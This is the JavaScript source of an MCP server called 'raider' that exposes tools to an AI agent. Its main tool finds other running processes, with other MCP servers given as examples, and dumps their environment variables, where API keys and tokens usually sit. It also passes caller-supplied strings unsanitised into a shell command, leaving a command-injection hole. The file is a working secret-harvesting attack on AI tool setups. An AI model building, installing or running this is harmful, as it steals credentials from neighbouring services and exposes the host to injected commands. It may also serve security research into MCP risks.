import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { z } from "zod";
import { exec } from "child_process";
import { promisify } from "util";
const execAsync = promisify(exec);
// Create server instance
const server = new McpServer({
  name: "raider",
  version: "1.0.0",
  capabilities: {
    resources: {},
    tools: {},
  },
});
// Register raider tools
// This is a simple tool to show the most simple response from raider.]
// PROMPT: What is the status of raider currently?
server.tool("get_raider_status", "Get the status of Raider", async ({}) => {
  return {
    content: [
      {
        type: "text",
        text: "hacking away",
      },
    ],
  };
});
// This is a tool to get the environment variables of a process.
// PROMPT: What are the environment variables of the process running "node" and "mcp-weather"?
server.tool(
  "get_environment_variables",
  "Get the environment variables of a process by searching for multiple strings",
  {
    searchStrings: z
      .array(z.string())
      .describe(
        "Array of strings to grep for in process list (e.g., ['node', 'mcp-weather'])"
      ),
  },
  async ({ searchStrings }) => {
    try {
      // Build the grep command chain
      const grepChain = searchStrings.map((str) => `grep ${str}`).join(" | ");
      const psCommand = `ps auxww | ${grepChain}`;
      // Execute the ps command to find matching processes
      const { stdout: psOutput } = await execAsync(psCommand);
      if (!psOutput.trim()) {
        return {
          content: [
            {
              type: "text",
              text: "No processes found matching the search criteria",
            },
          ],
        };
      }
      // Extract process ID from the first matching process
      const lines = psOutput.trim().split("\n");
      const firstLine = lines[0];
      const columns = firstLine.trim().split(/\s+/);
      const pid = columns[1];
      if (!pid) {
        return {
          content: [
            {
              type: "text",
              text: "Could not extract process ID from grep results",
            },
          ],
        };
      }
      // Get environment variables using ps eww
      const { stdout: envOutput } = await execAsync(`ps eww -p ${pid}`);
      // Parse the environment variables
      const envLines = envOutput.trim().split("\n");
      if (envLines.length < 2) {
        return {
          content: [
            {
              type: "text",
              text: "Could not retrieve environment variables",
            },
          ],
        };
      }
      // Extract environment variables from the command line
      const commandLine = envLines[1];
      const envVarMatch = commandLine.match(/\s([A-Z_][A-Z0-9_]*=\S+)/g);
      if (!envVarMatch) {
        return {
          content: [
            {
              type: "text",
              text: "No environment variables found in process output",
            },
          ],
        };
      }
      // Parse environment variables into structured format
      const envVars = {};
      envVarMatch.forEach((match) => {
        const trimmed = match.trim();
        const [key, ...valueParts] = trimmed.split("=");
        envVars[key] = valueParts.join("=");
      });
      return {
        content: [
          {
            type: "text",
            text: JSON.stringify(
              {
                processId: pid,
                environmentVariables: envVars,
                processInfo: firstLine,
              },
              null,
              2
            ),
          },
        ],
      };
    } catch (error) {
      return {
        content: [
          {
            type: "text",
            text: `Error retrieving environment variables: ${
              error instanceof Error ? error.message : String(error)
            }`,
          },
        ],
      };
    }
  }
);
async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Raider MCP Server running on stdio");
}
main().catch((error) => {
  console.error("Fatal error in main():", error);
  process.exit(1);
});
